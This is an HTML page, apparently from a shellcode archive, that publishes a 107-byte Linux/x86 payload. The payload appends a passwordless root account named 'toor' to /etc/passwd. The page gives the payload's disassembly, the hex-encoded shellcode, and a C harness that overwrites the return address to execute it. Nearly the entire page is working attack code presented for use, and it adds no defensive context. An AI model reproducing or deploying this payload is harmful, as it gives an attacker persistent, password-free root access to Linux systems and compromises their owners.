<html><head><title>Linux/x86 - append /etc/passwd &amp; exit() - 107 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
    append_passwd.c
    Payload: Adds the string: [toor::0:0:t00r:/root:/bin/bash] to /etc/passwd thereby adding a password-less root account with login name &quot;toor&quot;.
    Platform: linux/x86
    Size: 107 bytes
    Author: $andman, n4mdn4s[4T]gmail.com
*/

/*
08049054 &lt;_start&gt;:
 8049054:    eb 38                   jmp    804908e &lt;callfunc&gt;

08049056 &lt;func&gt;:
 8049056:    5e                      pop    %esi
 8049057:    31 c0                   xor    %eax,%eax
 8049059:    88 46 0b                mov    %al,0xb(%esi)
 804905c:    88 46 2b                mov    %al,0x2b(%esi)
 804905f:    c6 46 2a 0a             movb   $0xa,0x2a(%esi)
 8049063:    8d 5e 0c                lea    0xc(%esi),%ebx
 8049066:    89 5e 2c                mov    %ebx,0x2c(%esi)
 8049069:    8d 1e                   lea    (%esi),%ebx
 804906b:    66 b9 42 04             mov    $0x442,%cx
 804906f:    66 ba a4 01             mov    $0x1a4,%dx
 8049073:    b0 05                   mov    $0x5,%al
 8049075:    cd 80                   int    $0x80
 8049077:    89 c3                   mov    %eax,%ebx
 8049079:    31 d2                   xor    %edx,%edx
 804907b:    8b 4e 2c                mov    0x2c(%esi),%ecx
 804907e:    b2 1f                   mov    $0x1f,%dl
 8049080:    b0 04                   mov    $0x4,%al
 8049082:    cd 80                   int    $0x80
 8049084:    b0 06                   mov    $0x6,%al
 8049086:    cd 80                   int    $0x80
 8049088:    b0 01                   mov    $0x1,%al
 804908a:    31 db                   xor    %ebx,%ebx
 804908c:    cd 80                   int    $0x80
 
 0804908e &lt;callfunc&gt;:
 804908e:    e8 c3 ff ff ff          call   8049056 &lt;func&gt;
 8049093:    ......string.......
*/

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

char shell[]=   &quot;\xeb\x38\x5e\x31\xc0\x88\x46\x0b\x88\x46\x2b\xc6\x46\x2a\x0a\x8d\x5e\x0c\x89\x5e\x2c\x8d\x1e&quot;
                &quot;\x66\xb9\x42\x04\x66\xba\xa4\x01\xb0\x05\xcd\x80\x89\xc3\x31\xd2\x8b\x4e\x2c\xb2\x1f\xb0\x04&quot;
                &quot;\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3\xff\xff\xff\x2f\x65\x74\x63\x2f\x70&quot;
                &quot;\x61\x73\x73\x77\x64\x23\x74\x6f\x6f\x72\x3a\x3a\x30\x3a\x30\x3a\x74\x30\x30\x72\x3a\x2f\x72&quot;
                &quot;\x6f\x6f\x74\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x23&quot;;

main()
{
    printf(&quot;[+]shellcode length %d\n&quot;, strlen(shell));
    int *ret;
    ret = (int *)&amp;ret + 2;
    (*ret) = (int)shell;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
